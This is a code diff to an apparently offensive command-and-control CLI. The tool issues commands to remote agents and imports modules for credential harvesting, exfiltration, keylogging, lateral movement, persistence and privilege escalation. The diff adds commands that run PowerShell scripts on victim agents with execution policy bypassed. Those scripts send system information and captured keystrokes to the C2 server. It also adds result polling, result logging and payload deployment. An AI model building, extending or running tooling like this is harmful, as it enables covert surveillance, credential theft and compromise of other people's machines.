@@ -17,16 +17,16 @@ import json
 from typing import Optional
 import time
 
-# Add modules directory to sys.path
-sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
+# Ensure the 'modules' directory is in the Python path
+sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
 
-import credential_harvesting as credential_harvesting
-import exfiltration
-import keylogging
-import lateral_movement
-import persistence
-import privilege_escalation
-import reconnaissance
+from modules import credential_harvesting
+from modules import exfiltration
+from modules import keylogging
+from modules import lateral_movement
+from modules import persistence
+from modules import privilege_escalation
+from modules import reconnaissance
 
 cli = typer.Typer()
 
@@ -37,12 +37,17 @@ def pretty_print_json(data):
     formatted_json = json.dumps(data, indent=4, sort_keys=True)
     typer.echo(formatted_json)
 
+def log_result(agent_id: str, result: str):
+    """Log result to a file for tracking."""
+    with open("result_log.txt", "a") as f:
+        f.write(f"Agent {agent_id} Result: {result}\n")
+
 @cli.command("list-agents")
 def list_agents_cli():
     """List all registered agents."""
     try:
         response = requests.get(f"{C2_URL}/list_agents")
-        response.raise_for_status()  
+        response.raise_for_status()
         agents = response.json().get("agents", [])
         if agents:
             typer.echo("Registered Agents:")
@@ -54,19 +59,39 @@ def list_agents_cli():
 
 @cli.command("send-command")
 def send_command(agent_id: str, command: str):
-    """Send a command to a specific agent."""
+    """Send a command to a specific agent and retry until the result is available."""
     payload = {
         "AgentID": agent_id,
         "Command": command
     }
     try:
+        # Send the command
         response = requests.post(f"{C2_URL}/sendcommand", json=payload)
-        response.raise_for_status()  
+        response.raise_for_status()
         typer.echo(f"Command sent to agent {agent_id}.")
-        time.sleep(30)  
-        fetch_result(agent_id)
+
+        # Wait for 30 seconds before fetching result (adjust as necessary)
+        time.sleep(30)
+
+        # Check for result and retry up to 3 times if not available
+        retry_attempts = 3
+        for attempt in range(retry_attempts):
+            fetch_result(agent_id)
+            time.sleep(10)  # Wait 10 seconds before the next retry
     except requests.RequestException as e:
         typer.echo(f"Failed to send command: {e}")
+
+def fetch_result(agent_id: str):
+    """Fetch the result of a command from the agent."""
+    try:
+        response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
+        response.raise_for_status()
+        result = response.json().get("Result", "No result available")
+        typer.echo(f"Result from agent {agent_id}:")
+        pretty_print_json(result)
+        log_result(agent_id, result)  # Log the result to a file
+    except requests.RequestException as e:
+        typer.echo(f"Failed to fetch result: {e}")
 
 @cli.command("generate-payload")
 def generate_payload(platform: str):
@@ -92,10 +117,10 @@ def escalate_privileges():
     typer.echo("Privilege escalation attempted.")
 
 @cli.command("gather-system-info")
-def gather_system_info():
-    system_info = reconnaissance.gather_system_info()
-    typer.echo("System Information:")
-    pretty_print_json(system_info)
+def gather_system_info(agent_id: str):
+    script_path = os.path.join(os.path.dirname(__file__), '..', 'modules', 'windows', 'gather_system_info.ps1')
+    command = f"powershell -ExecutionPolicy Bypass -File {script_path} -C2Url {C2_URL}/receive_system_info -AgentID {agent_id}"
+    send_command(agent_id, command)
 
 @cli.command("exfiltrate-data")
 def exfiltrate_data(file_path: str):
@@ -103,10 +128,11 @@ def exfiltrate_data(file_path: str):
     typer.echo(f"Data exfiltration status: {status_code}")
 
 @cli.command("start-keylogger")
-def start_keylogger(log_file_path: str):
-    """Start a keylogger and save logs to the specified file."""
-    keylogging.start_keylogger(log_file_path)
-    typer.echo(f"Keylogger started, logging to {log_file_path}")
+def start_keylogger(agent_id: str):
+    """Start a keylogger and send logs to the C2 server."""
+    script_path = os.path.join(os.path.dirname(__file__), '..', 'modules', 'windows', 'keylogging.ps1')
+    command = f"powershell -ExecutionPolicy Bypass -File {script_path} -C2Url {C2_URL}/receive_keystrokes -AgentID {agent_id}"
+    send_command(agent_id, command)
 
 @cli.command("move-laterally")
 def move_laterally(target_ip: str, username: str, password: str):
@@ -117,8 +143,8 @@ def move_laterally(target_ip: str, username: str, password: str):
 @cli.command("deploy-payload")
 def deploy_payload(agent_type: str):
     project_root = os.path.dirname(os.path.abspath(__file__))
-    payload_dir = os.path.join(project_root, "../payloads")
-    
+    payload_dir = os.path.join(project_root, "..", "payloads")
+
     if agent_type == "macos":
         subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
     elif agent_type == "linux":
@@ -147,22 +173,11 @@ def select_agent(agent: Optional[str] = typer.Argument(None, help="The ID of the
         if command.lower() == "exit":
             break
         response = requests.post(f"{C2_URL}/sendcommand", json={"AgentID": agent_id, "Command": command})
-        response.raise_for_status()  
+        response.raise_for_status()
         typer.echo(f"Command '{command}' sent to agent {agent_id}")
 
-        time.sleep(30)  
+        time.sleep(30)
         fetch_result(agent_id)
-
-def fetch_result(agent_id: str):
-    """Fetch the result of a command from the agent."""
-    try:
-        response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
-        response.raise_for_status()  
-        result = response.json().get("Result", "No result available")
-        typer.echo(f"Result from agent {agent_id}:")
-        pretty_print_json(result)
-    except requests.RequestException as e:
-        typer.echo(f"Failed to fetch result: {e}")
 
 @cli.command("generate-report")
 def generate_report():
